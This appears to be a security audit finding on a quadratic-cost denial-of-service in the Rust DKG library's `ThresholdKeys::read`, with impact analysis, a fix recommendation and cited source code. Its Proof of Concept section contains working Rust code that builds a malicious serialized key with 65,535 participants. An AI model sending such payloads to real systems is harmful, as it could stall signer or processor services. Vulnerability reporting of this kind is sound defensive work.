### Title
Unbounded serialized threshold size causes quadratic deserialization DoS - ([File: crypto/dkg/src/lib.rs])

### Summary
`ThresholdKeys::read` accepts an attacker-controlled participant count `n` and then invokes `ThresholdKeys::new`. For Lagrange-interpolated keys with `t = n = 65535`, group-key reconstruction performs a nested Lagrange interpolation over all `t` participants, causing approximately 4.3 billion field operations from a single untrusted serialized key. This is analogous to the reported unbounded collateral iteration: attacker-controlled collection size determines whether the operation becomes prohibitively expensive.

### Finding Description
`ThresholdKeys::read` deserializes `t`, `n`, and `i` directly from untrusted bytes, reads `n` verification shares, and passes the result to `ThresholdKeys::new` without imposing a practical participant limit [1](#0-0) . `ThresholdKeys::new` constructs the participant list `1..=t` and calculates each participant’s Lagrange interpolation factor [2](#0-1) . Each Lagrange factor calculation iterates over the full included participant list [3](#0-2) .

Therefore, `t = n = 65535` produces approximately `65535²` inner-loop operations during a single deserialization call. The input can consist of valid encodings, so the path reaches this computation rather than failing during parsing.

### Impact Explanation
An unprivileged party who can submit serialized `ThresholdKeys` bytes to `ThresholdKeys::read` can force the victim to spend billions of scalar operations reconstructing the group key. This can stall a signer/processor thread or exhaust CPU resources in an environment where serialized threshold keys are accepted from untrusted input. The attack does not require malformed points, collusion, leaked keys, or a malicious validator.

### Likelihood Explanation
The entire malicious structure is controlled by the sender: `t`, `n`, the participant index, the interpolation selector, the secret-share encoding, and all verification shares. `Participant` is a `u16`, so the attacker can select the maximum representable participant set without encoding a larger external message [4](#0-3) . The likelihood depends on whether an application exposes `ThresholdKeys::read` to untrusted bytes, but that entry point is explicitly reachable with attacker-controlled serialization.

### Recommendation
Impose a protocol-appropriate maximum `n`/`t` before reading verification shares or constructing `ThresholdKeys`. Reject oversized values immediately after parsing `t` and `n`, before allocating vectors or performing interpolation. If arbitrary local uses must remain supported, expose separate bounded and unbounded deserialization APIs and use the bounded API for untrusted input.

### Proof of Concept
```rust
use ciphersuite::{
  group::{ff::Field, GroupEncoding},
  Ciphersuite,
};
use frost::{curve::Secp256k1, ThresholdKeys};

// Encodes a syntactically valid Lagrange ThresholdKeys object with t = n = u16::MAX.
fn malicious_serialized_keys() -> Vec<u8> {
  let mut bytes = Vec::new();

  bytes.extend(u32::try_from(Secp256k1::ID.len()).unwrap().to_le_bytes());
  bytes.extend(Secp256k1::ID);

  bytes.extend(u16::MAX.to_le_bytes()); // t
  bytes.extend(u16::MAX.to_le_bytes()); // n
  bytes.extend(1u16.to_le_bytes());     // i

  bytes.push(1); // Interpolation::Lagrange
  bytes.extend(<Secp256k1 as Ciphersuite>::F::ONE.to_repr().as_ref());

  let generator = Secp256k1::generator().to_bytes();
  for _ in 1 ..= u16::MAX {
    bytes.extend(generator.as_ref());
  }

  bytes
}

let input = malicious_serialized_keys();
let _ = ThresholdKeys::<Secp256k1>::read(&mut input.as_slice());
```

This reaches `ThresholdKeys::new` with `65,535` participants. Group-key reconstruction then evaluates `65,535` Lagrange factors, each iterating over the `65,535`-participant list.

### Citations

**File:** crypto/dkg/src/lib.rs (L23-41)
```rust
/// The ID of a participant, defined as a non-zero u16.
#[derive(Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash, Debug, Zeroize)]
#[cfg_attr(feature = "borsh", derive(borsh::BorshSerialize))]
pub struct Participant(u16);
impl Participant {
  /// Create a new Participant identifier from a u16.
  pub const fn new(i: u16) -> Option<Participant> {
    if i == 0 {
      None
    } else {
      Some(Participant(i))
    }
  }

  /// Convert a Participant identifier to bytes.
  #[allow(clippy::wrong_self_convention)]
  pub const fn to_bytes(&self) -> [u8; 2] {
    self.0.to_le_bytes()
  }
```

**File:** crypto/dkg/src/lib.rs (L226-246)
```rust
  fn interpolation_factor(&self, i: Participant, included: &[Participant]) -> F {
    match self {
      Interpolation::Constant(c) => c[usize::from(u16::from(i) - 1)],
      Interpolation::Lagrange => {
        let i_f = F::from(u64::from(u16::from(i)));

        let mut num = F::ONE;
        let mut denom = F::ONE;
        for l in included {
          if i == *l {
            continue;
          }

          let share = F::from(u64::from(u16::from(*l)));
          num *= share;
          denom *= share - i_f;
        }

        // Safe as this will only be 0 if we're part of the above loop
        // (which we have an if case to avoid)
        num * denom.invert().unwrap()
```

**File:** crypto/dkg/src/lib.rs (L376-379)
```rust
    let t = (1 ..= params.t()).map(Participant).collect::<Vec<_>>();
    let group_key =
      t.iter().map(|i| verification_shares[i] * interpolation.interpolation_factor(*i, &t)).sum();

```

**File:** crypto/dkg/src/lib.rs (L591-631)
```rust
    let (t, n, i) = {
      let mut read_u16 = || -> io::Result<u16> {
        let mut value = [0; 2];
        reader.read_exact(&mut value)?;
        Ok(u16::from_le_bytes(value))
      };
      (
        read_u16()?,
        read_u16()?,
        Participant::new(read_u16()?).ok_or(io::Error::other("invalid participant index"))?,
      )
    };

    let mut interpolation = [0];
    reader.read_exact(&mut interpolation)?;
    let interpolation = match interpolation[0] {
      0 => Interpolation::Constant({
        let mut res = Vec::with_capacity(usize::from(n));
        for _ in 0 .. n {
          res.push(C::read_F(reader)?);
        }
        res
      }),
      1 => Interpolation::Lagrange,
      _ => Err(io::Error::other("invalid interpolation method"))?,
    };

    let secret_share = Zeroizing::new(C::read_F(reader)?);

    let mut verification_shares = HashMap::new();
    for l in (1 ..= n).map(Participant) {
      verification_shares.insert(l, <C as Ciphersuite>::read_G(reader)?);
    }

    ThresholdKeys::new(
      ThresholdParams::new(t, n, i).map_err(io::Error::other)?,
      interpolation,
      secret_share,
      verification_shares,
    )
    .map_err(io::Error::other)
```
